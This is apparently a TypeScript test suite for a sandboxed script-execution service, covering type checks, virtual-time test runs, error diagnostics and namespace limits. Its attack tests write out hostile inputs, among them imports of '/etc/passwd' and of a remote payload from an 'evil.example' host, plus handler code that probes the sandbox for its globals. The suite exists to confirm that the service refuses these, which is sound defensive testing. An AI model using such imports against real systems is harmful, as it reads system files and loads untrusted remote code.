/**
 * Area "Check and test" of the release gate: `POST /v1/check` and the checks at start on setup A
 * (deployed), and `POST /v1/test` (test runs, in virtual time) on setup B, one node, and
 * on each node of setup A: every node runs tests (`archi/03-execution.md`, "Starting a run";
 * `archi/04-tools.md`, "Type-checking"; `archi/05`, "Test runs").
 */
import {
  Api,
  evidence,
  expect,
  expectOk,
  expectProblem,
  expectRefused,
  newTenant,
  stacks,
  type Tenant,
  test,
} from "../support/gate.js";
import { runIds, startRun } from "../support/runs-helpers.js";

let tenant: Tenant;
let api: Api;
let actionSet: string;
/** The tenant on setup B, for `/v1/test`. */
let tested: Api;
let testedActionSet: string;

const ACTION_SET = {
  harness: [
    {
      name: "crm.lookup",
      description: "Find a customer by email.",
      inputSchema: { type: "object", properties: { email: { type: "string" } }, required: ["email"] },
      outputSchema: {
        type: "object",
        properties: { id: { type: "string" }, notes: { type: "string" } },
        required: ["id", "notes"],
      },
    },
  ],
};

const SCENARIO_SCRIPT = `import { crm } from "rewind:actions";
import { signal, sleep } from "rewind";

export default async function main(input: { email: string }) {
  const customer = await crm.lookup({ email: input.email });
  const before = Date.now();
  await sleep("10d");
  const decision = await signal<{ refund: number }>("decision");
  return { customer: customer.id, refund: decision.refund, slept: Date.now() - before };
}
`;

test.beforeAll(async () => {
  tenant = await newTenant("check-test");
  api = tenant.api.ns("checks");
  const created = await tenant.api.post("/v1/action-sets", ACTION_SET);
  expectOk(created);
  actionSet = created.json.id;

  const onB = await newTenant("check-test", stacks().b);
  tested = onB.api.ns("tests");
  const createdB = await onB.api.post("/v1/action-sets", ACTION_SET);
  expectOk(createdB);
  testedActionSet = createdB.json.id;
});

/** `POST /v1/check`. */
const check = (as: Api, script: string, withActionSet = actionSet) => as.post("/v1/check", { code: script, actionSet: withActionSet });

// ---------------------------------------------------------------------------------------------
// Success

test("a correct script checks clean against its actionSet", { tag: "@success" }, async () => {
  const reply = await check(
    api,
    `import { crm } from "rewind:actions";
export default async function main(input: { email: string }) {
  const customer = await crm.lookup({ email: input.email });
  return customer.notes.length;
}
`,
  );
  expectOk(reply, 200);
  expect(reply.json.ok, JSON.stringify(reply.json)).toBe(true);
  expect(reply.json.diagnostics.filter((d: any) => d.severity === "error")).toEqual([]);
});

test("a test runs as a test run in virtual time: a 10-day sleep, a signal, a tool's answer", { tag: "@success" }, async () => {
  const started = Date.now();
  const reply = await tested.post("/v1/test", {
    code: SCENARIO_SCRIPT,
    actionSet: testedActionSet,
    tests: [
      {
        name: "refunds ada",
        input: { email: "ada@example.com" },
        world: { actions: { "crm.lookup": { returns: { id: "cus_ada", notes: "" } } } },
        signals: [{ name: "decision", payload: { refund: 10 } }],
        expect: {
          status: "completed",
          output: { customer: "cus_ada", refund: 10 },
          calls: [{ action: "crm.lookup", args: { email: "ada@example.com" }, times: 1 }],
        },
      },
    ],
  });
  expectOk(reply, 200);
  expect(reply.json.passed, JSON.stringify(reply.json)).toBe(true);
  const [result] = reply.json.tests;
  expect(result.failures).toEqual([]);
  expect(result.status).toBe("completed");
  expect(result.output.slept).toBe(10 * 24 * 3_600_000);
  expect(result.calls).toEqual({ "crm.lookup": 1 });
  expect(result.transcript).toContain("crm.lookup");
  expect(Date.now() - started, "ten days pass in virtual time").toBeLessThan(20_000);
});

test("a test's TypeScript handlers answer the calls", { tag: "@success" }, async () => {
  const reply = await tested.post("/v1/test", {
    code: SCENARIO_SCRIPT,
    actionSet: testedActionSet,
    tests: [
      {
        name: "refunds grace nothing",
        input: { email: "grace@example.com" },
        world: {
          handlers: `export default {
  crm: { lookup: ({ email }, call) => ({ id: "cus_" + email.split("@")[0], notes: call.action }) },
};
`,
        },
        signals: [{ name: "decision", when: "2h", payload: { refund: 0 } }],
        expect: { status: "completed", output: { customer: "cus_grace", refund: 0 } },
      },
    ],
  });
  expectOk(reply, 200);
  expect(reply.json.passed, JSON.stringify(reply.json)).toBe(true);
});

// ---------------------------------------------------------------------------------------------
// Failures

test("a type error is reported for a model: its code, its line and a frame of the source", { tag: "@failure" }, async () => {
  const reply = await check(
    api,
    `import { crm } from "rewind:actions";
export default async function main() {
  const customer = await crm.lookup({ email: 42 });
  return customer.id;
}
`,
  );
  expectOk(reply, 200);
  expect(reply.json.ok).toBe(false);
  const error = reply.json.diagnostics.find((d: any) => d.severity === "error");
  expect(error, JSON.stringify(reply.json)).toBeTruthy();
  expect(error.code).toMatch(/^TS\d+$/);
  expect(error.location).toMatchObject({ line: 3 });
  expect(error.frame ?? "").toContain("crm.lookup");
});

test("the checker's own rules: a forgotten await, and a global the sandbox has not with a hint", { tag: "@failure" }, async () => {
  const floating = await check(
    api,
    `import { crm } from "rewind:actions";
export default async function main() {
  crm.lookup({ email: "a@example.com" });
  return "done";
}
`,
  );
  expectOk(floating, 200);
  expect(floating.json.ok).toBe(false);
  expect(floating.json.diagnostics.map((d: any) => d.code)).toContain("rewind/floating-promise");

  const absent = await check(api, `export default async function main() {\n  return process.env.HOME;\n}\n`);
  expectOk(absent, 200);
  expect(absent.json.ok).toBe(false);
  const hinted = absent.json.diagnostics.find((d: any) => typeof d.hint === "string" && d.hint.length > 0);
  expect(hinted, JSON.stringify(absent.json)).toBeTruthy();
  expect(`${hinted.message} ${hinted.hint}`).toContain("process");
});

test("a start whose code does not type-check is 422 invalid-code with its diagnostics, and no run exists", { tag: "@failure" }, async () => {
  const before = await runIds(api);
  const reply = await startRun(api, {
    actionSet,
    code: `import { crm } from "rewind:actions";
export default async function main() {
  return await crm.lookup({ email: 42 });
}
`,
  });
  expectProblem(reply, 422, "invalid-code");
  expect((reply.json.diagnostics ?? []).some((d: any) => /^TS\d+$/.test(d.code)), reply.text).toBe(true);
  expect(await runIds(api)).toEqual(before);
});

test("the checks at start refuse what cannot run even unchecked: a syntax error, no default export, a tool not in the actionSet", { tag: "@failure" }, async () => {
  const before = await runIds(api);
  const cases: [string, string][] = [
    ["export default async function main( {\n  return 1;\n}\n", "SyntaxError"],
    ["export async function main() {\n  return 1;\n}\n", "no default export"],
    [`import { billing } from "rewind:actions";\nexport default async function main() { return billing.refund({}); }\n`, "no export named \"billing\""],
    [`export default 42;\n`, "export default` its main function"],
  ];
  for (const [script, words] of cases) {
    const reply = await startRun(api, { actionSet, code: script, check: false });
    expectProblem(reply, 422, "invalid-code");
    expect(reply.json.detail, reply.text).toContain(words);
  }
  expect(await runIds(api)).toEqual(before);
});

test("a test whose expectations do not hold says which, in sentences", { tag: "@failure" }, async () => {
  const reply = await tested.post("/v1/test", {
    code: SCENARIO_SCRIPT,
    actionSet: testedActionSet,
    tests: [
      {
        name: "the CRM is down",
        input: { email: "ada@example.com" },
        world: { actions: { "crm.lookup": { error: { message: "the CRM is down" } } } },
        signals: [{ name: "decision", payload: { refund: 10 } }],
        expect: { status: "completed", calls: [{ action: "crm.lookup", times: 2 }] },
      },
    ],
  });
  expectOk(reply, 200);
  expect(reply.json.passed).toBe(false);
  const [result] = reply.json.tests;
  expect(result.problem).toBe("failed");
  expect(result.status).toBe("failed");
  expect(result.error?.name).toBe("ActionError");
  expect(result.failures.length).toBeGreaterThanOrEqual(2);
  expect(result.failures.join("\n")).toContain("crm.lookup");
});

test("on setup A, every node runs the tests itself", { tag: "@success" }, async () => {
  const { nodeUrls } = stacks().a;
  expect(nodeUrls.length).toBeGreaterThan(1);
  for (const url of nodeUrls) {
    // Each node directly, not through the edge.
    const reply = await new Api(url, tenant.ownerKey).ns("checks").post("/v1/test", {
      code: "export default async function main(input: { n: number }) { return input.n + 1; }\n",
      tests: [{ name: "adds one", input: { n: 41 }, expect: { status: "completed", output: 42 } }],
    });
    expectOk(reply, 200);
    expect(reply.json.passed, `${url}: ${JSON.stringify(reply.json)}`).toBe(true);
  }
  evidence(`POST /v1/test on each of the ${nodeUrls.length} nodes: passed`);
});

test("checking or testing without Rewind-Namespace is 400", { tag: "@failure" }, async () => {
  expectProblem(await tenant.api.post("/v1/check", { code: "export default async function main() {}\n" }), 400, "invalid-request");
  expectProblem(await tenant.api.post("/v1/test", { code: "export default async function main() {}\n" }), 400, "invalid-request");
});

test("a namespace's maxCodeLines refuses longer code in check, test and start alike", { tag: "@failure" }, async () => {
  const long = `export default async function main() {\n  const a = 1;\n  const b = 2;\n  return a + b;\n}\n`;
  for (const [as, owner] of [
    [api, tenant.api],
    [tested, undefined],
  ] as const) {
    const ownerApi = owner ?? new (await import("../support/gate.js")).Api(stacks().b.url, (as as Api).bearer);
    expectOk(await ownerApi.put("/v1/namespaces/short", { exceptions: { maxCodeLines: 3 } }));
  }
  const short = api.ns("short");
  const checked = await short.post("/v1/check", { code: long });
  expectProblem(checked, 422, "invalid-code");
  expect(checked.json.detail).toMatch(/lines/);
  expectProblem(await startRun(short, { code: long }), 422, "invalid-code");
  expectProblem(await tested.ns("short").post("/v1/test", { code: long }), 422, "invalid-code");
  // The same script in a namespace without the exception is fine.
  expect((await api.post("/v1/check", { code: long })).json.ok).toBe(true);
});

// ---------------------------------------------------------------------------------------------
// Attacks

test("every way to load code from outside is refused before any run exists", { tag: "@attack" }, async () => {
  const sources = [
    `import fs from "node:fs";\nexport default async function main() { return typeof fs; }\n`,
    `import passwd from "file:///etc/passwd";\nexport default async function main() { return passwd; }\n`,
    `import payload from "https://evil.example/payload.js";\nexport default async function main() { return payload; }\n`,
    `import payload from "data:text/javascript,export default 1";\nexport default async function main() { return payload; }\n`,
    `import other from "./other.ts";\nexport default async function main() { return other; }\n`,
    `export default async function main() { const fs = await import("node:fs"); return typeof fs; }\n`,
    `import fs = require("fs");\nexport default async function main() { return typeof fs; }\n`,
    // archi/03-execution.md, "Starting a run": a `require` is refused at start.
    `export default async function main() { const fs = require("fs"); return typeof fs; }\n`,
    `import { readFile } from "rewind";\nexport default async function main() { return typeof readFile; }\n`,
  ];
  for (const script of sources) {
    const reply = await expectRefused({
      attempt: () => startRun(api, { code: script, check: false }),
      status: 422,
      slug: "invalid-code",
      probe: () => runIds(api),
    });
    evidence(`${script.split("\n")[0]!.slice(0, 70)} → 422: ${String(reply.json.detail).slice(0, 120)}`);
  }
});

test("handlers run in a sandbox of their own: no imports, no process, no network", { tag: "@attack" }, async () => {
  const imported = await tested.post("/v1/test", {
    code: SCENARIO_SCRIPT,
    actionSet: testedActionSet,
    tests: [
      {
        name: "imports node:fs",
        world: { handlers: `import fs from "node:fs";\nexport default { crm: { lookup: () => ({ id: typeof fs, notes: "" }) } };\n` },
      },
    ],
  });
  expectOk(imported, 200);
  expect(imported.json.passed).toBe(false);
  expect(imported.json.tests[0].failures.join("\n")).toContain("the handlers cannot load");

  const probing = await tested.post("/v1/test", {
    code: SCENARIO_SCRIPT,
    actionSet: testedActionSet,
    tests: [
      {
        name: "probes its sandbox",
        input: { email: "eve@example.com" },
        world: {
          handlers: `export default {
  crm: {
    lookup: () => ({
      id: [typeof process, typeof Deno, typeof require, typeof fetch, typeof WebAssembly].join("/"),
      notes: "",
    }),
  },
};
`,
        },
        signals: [{ name: "decision", payload: { refund: 0 } }],
        expect: { status: "completed" },
      },
    ],
  });
  expectOk(probing, 200);
  const [probed] = probing.json.tests;
  expect(probed.status, JSON.stringify(probing.json)).toBe("completed");
  expect(probed.output.customer).toBe("undefined/undefined/undefined/undefined/undefined");
  evidence("handlers importing node:fs: the test fails, the handlers cannot load; process, Deno, require, fetch, WebAssembly are undefined in their isolate");
});
